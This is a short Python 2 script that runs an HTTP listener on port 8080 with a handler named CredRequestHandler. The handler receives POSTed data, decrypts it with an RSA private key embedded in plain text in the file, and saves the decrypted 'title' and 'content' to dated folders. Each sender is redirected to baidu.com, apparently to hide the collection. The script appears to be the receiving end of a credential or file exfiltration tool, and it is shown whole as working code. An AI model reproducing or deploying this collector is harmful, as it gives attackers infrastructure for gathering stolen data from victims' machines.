import SimpleHTTPServer
import SocketServer
import urllib,base64,os,time
from Crypto.Cipher import PKCS1_OAEP
from Crypto.PublicKey import RSA

private_key='-----BEGIN RSA PRIVATE KEY-----\nMIIEpAIBAAKCAQEA0MjR0fTp3OxG+iVllpWPk0/hn9uh5KxyyrGLSHOYmQUItYUe\nqSGHbkUK1C/s7d9jmezOP0e88zoepg8pbnBgshhOlisDNq31OuYPaJRgZTRpEL6V\nDSSdT5kSkIOdj+4hSHSqEtMSAG25a6k3Ep6PyTvZXwMHOSZsl6qm8F48iRL1NA2k\nE4zx+XEabeTE62idew/Ol/BGudfv7hf21aNRK2aLJPPJO0Hrde+Fj1DJdCiqBnM+\nhb/hPZ+SUcARbUSmGQC+JXmifLtPdrQwqHlI0njY/FV+ZQTax5WZjr3cyBw9+Rgw\nQ4qnUchtBzWFZamedZW633WgdM4MHImLKjO2VQIDAQABAoIBAAkcemubMIl/lilc\ncG594GIhXktHnm0ISYom7VkgEky7N4IUaR4gZHSfdrWD0ecflI0nFGkWjFxg8O12\nQ+yZ4t5iySssfVtphAYp/AooT3ybKOqeJosISgUrPPApjjq1vaYX0UQ5CdQS9cCJ\nBeo+GTBC+F15GFuaHasQu3BJ7IJeyTvuACs07xXyqF7W8krPiTwVOGlRLJ2T3OrV\nFJpVwrJI36TW2uANMGw6HisHYD/6HiJWFs8BsIlWpoOoeIlA7Z9pu7UonJnodPq6\nZZXYexziiN2ou29o2I0kByZuGtffBEJIZp8DXJ6BvPjCYVDCmrOSW9Gy8CZsqFbO\nzyPvjAECgYEA321EXpnZLYUwCYHY2SQGeva3mNtJxJ1sFNEPhlEWbCNEhEpHp/8M\nw/xLo8m/Mo/6ja3tvycrSxdYgrncuHt2PO1i/PjawevISu0cxWn14MsW/aKn7iCM\n4j+XzMviBA6KtmMQVu8FD8SYpPKQ1uDFmpRLApLBvKgtatdQaUqKoBUCgYEA7zkR\n8fGMLXXjaN3JOVEQ2vFT3oFuew/Y1dwMbbSsqwZhlerrK7deSVzE9ybRYqzUaUi/\nZdmzxu4jRRfMxf406VGgVu9d6gH+7sUVEEejL7GpqqOmTgRanWkl3+AbGyTQiIs6\n99DxZUIlFkStzhqPNRhV363X4vYWiVRWUT9gDUECgYEA0Fg7LiA29gzB28u6o9nF\nNTsFv8OVSYQmuk6tNGo/B33nsZj2swDSLZwCCOzjn0nFsgJjtiHXbEGL5vNckKeI\nfY48BXwlujmdX8k2UBzcDNA1UzUvdY3i8kOs0Wu6CmBpF2TPYtGmnaqNURtk1wtp\nGRl5zR9/C+aj24KG2HiLRnUCgYBf0kFQ40sd7omvuJ7geYtB18abasbhPkDBsQm9\na9B6FO1Dyrx2X1XCFwnCYecfGlFe9sfLuT8coMi55UWdzSxOhOavy+OXV0NRStoc\nEkXYVda7Rh/YQkA1qyeDnFXfMojhGLv/Bc+bmroWSF5CHztbriq/lPfTrnTqf0Cv\n/K2xwQKBgQC1GNifLywebLhE6p83fo/P3Vjbb0SFLlJpVdQrXqO50NwbF4m0SoZj\nQMnRjTsv/XaaLQMG0HFZ9IJznTmOr9pvWJjXVletG84U1g/1QtYkjI8pFTuMR3/k\nSIm2UnZRFoaqxE4me/lpJhgcgWxLpVA8Ow7TcXJFRb6WalxX+CPTkQ==\n-----END RSA PRIVATE KEY-----'

def decrypt_string(plaintext):
    key=RSA.importKey(private_key)
    key=PKCS1_OAEP.new(key)
    plaintext=base64.b64decode(plaintext)
    chunk_size=256
    offset=0
    decrypted=''
    while offset<len(plaintext):
        decrypted+=key.decrypt(plaintext[offset:offset+chunk_size])
        offset+=chunk_size
    return decrypted

class CredRequestHandler(SimpleHTTPServer.SimpleHTTPRequestHandler):
    def do_POST(self):
        content_length=int(self.headers['Content-Length'])
        creds=self.rfile.read(content_length).decode('utf-8')
        self.send_response(301)
        self.send_header('Location','https://www.baidu.com')
        self.end_headers
        creds=urllib.unquote(creds)
        point=creds.find('content')
        title=decrypt_string(creds[6:point-1])
        content=decrypt_string(creds[point+8:])
        print 'Title:'
        print title
        print '---------------------Content-------------------------'
        print '\n'
        print content
        print '----------------------End----------------------------'
        try:
            Time=time.strftime('%Y-%m%d',time.localtime())
            os.mkdir(Time)
        except OSError,e:
            pass         
        title=r'%s'%title
        title=title.split('\\')[-1].replace(' ','')
        try:
            filehandle=open('./%s/%s'%(Time,title),'w')
            filehandle.write(content)
            filehandle.close()
        except Exception,e:
            pass
try:
    print 'Start Listening...'
    sever=SocketServer.TCPServer(('0.0.0.0',8080),CredRequestHandler)
    sever.serve_forever()
except KeyboardInterrupt,e:
    pass
        
